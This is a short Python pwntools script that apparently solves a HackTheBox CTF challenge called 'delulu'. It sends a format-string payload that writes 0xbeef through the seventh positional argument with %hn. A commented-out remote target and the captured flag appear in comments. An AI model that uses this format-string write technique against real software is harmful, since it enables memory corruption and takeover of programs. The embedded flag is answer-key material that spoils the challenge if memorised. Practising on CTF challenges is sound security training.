#!/bin/python
from pwn import *
exe = ELF('./delulu_patched')
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
p = process(exe.path)
# p = remote('94.237.53.53',36909)
context.terminal = ['foot']
gdb.attach(p, gdbscript='''


           ''')
#################exploiting#####################
payload = f'%{0xbeef}c%7$hn'.encode()
# payload += f'%{4919}c%7$n'.encode()
p.sendlineafter(b'>>',payload)
#HTB{m45t3r_0f_d3c3pt10n}
##############the end###########################
p.interactive()
